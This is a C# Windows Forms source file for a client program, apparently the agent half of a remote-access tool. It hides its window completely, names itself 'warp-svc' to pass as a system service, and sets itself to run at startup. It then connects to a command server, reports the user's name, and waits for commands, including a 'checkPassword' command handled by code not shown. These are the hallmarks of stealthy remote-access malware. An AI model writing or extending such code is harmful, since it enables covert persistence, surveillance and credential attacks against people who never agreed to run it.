using System;
using System.Text.Json;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Windows.Forms;
using CyberEra_Client.Control;
using System.Runtime.InteropServices;
using CyberEra_Client.Model;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.DirectoryServices.ActiveDirectory;
using System.Threading;
using System.IO;
using System.ComponentModel;

namespace CyberEra_Client {
    public partial class ClientForm : Form {

        private static TcpClient client = new TcpClient();
        private static NetworkStream stream = null;

        private static WindowsControl WindowsController = new WindowsControl();
        private static PasswordControl PasswordController = new PasswordControl();
        private const int PORT = 8888;
        private const string HOST = "127.0.0.1";

        public ClientForm() {
            InitializeComponent();
            this.WindowState = FormWindowState.Minimized;
            this.Bounds = Screen.PrimaryScreen.WorkingArea;
            this.FormClosing += new FormClosingEventHandler(ClientFormClosing);
            this.ShowInTaskbar= false;
            this.Text = "warp-svc";
            this.Opacity = 0;
            WindowsController.SetAutorunValue(true);
           
           
            try {
                client.Connect(HOST, PORT);
                stream = client.GetStream();

                //
                //  send name
                //
                CommandBase command = new CommandBase("setName", SystemInformation.UserName);
                byte[] buffer = Encoding.Unicode.GetBytes(JsonSerializer.Serialize(command));
                LoggerControl.Info($"Send to server {Environment.MachineName}");
                stream.WriteAsync(buffer, 0, buffer.Length);

                //
                //  start reading commands
                //
                Task.Factory.StartNew(() => { readCommands(); });


            } catch (Exception ex) {
                LoggerControl.Error(ex.Message);
                LoggerControl.Error(ex.StackTrace);
            } finally {

            }
        }

        protected override CreateParams CreateParams {
            get {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        private void ClientFormClosing(object sender, System.ComponentModel.CancelEventArgs e) {
            byte[] buffer = Encoding.Unicode.GetBytes("END");
            stream.Write(buffer, 0, buffer.Length);
            LoggerControl.Info($"Send to server END");
            stream.WriteAsync(buffer, 0, buffer.Length);
            Disconnect();
        }

        public void readCommands() {

            try {
                var response = new List<byte>();
                while (true) {
                    Thread.Sleep(100);

                    string cmd = GetMsg();
                    if (cmd == "")
                        continue;

                    LoggerControl.Info($"recieve msg from server {cmd}");
                    if (cmd.Equals("END")) {
                        
                        this.Close();   
                        break;
                    }

                    CommandBase command = JsonSerializer.Deserialize<CommandBase>(cmd);
                    switch (command.CommandName) {
                        case "checkPassword":
                            PasswordController.CheckOldPassword(command.CommandArgs);
                            break;
                    }
                }
            } catch (Exception e) {
                LoggerControl.Error(e.Message);
                LoggerControl.Error(e.StackTrace);
            } finally {


            }
        }

        public string GetMsg() {
            if (stream == null)
                return "";

            byte[] data = new byte[4096];
            StringBuilder builder = new StringBuilder();
            int byteCount = 0;
            do {
                byteCount = stream.Read(data, 0, data.Length);
                builder.Append(Encoding.Unicode.GetString(data, 0, byteCount));
            } while (stream.DataAvailable);

            return builder.ToString();
        }

        private static void Disconnect() {
            if (stream != null)
                stream.Close();
            if (client != null)
                client.Close();
        }

    }
}

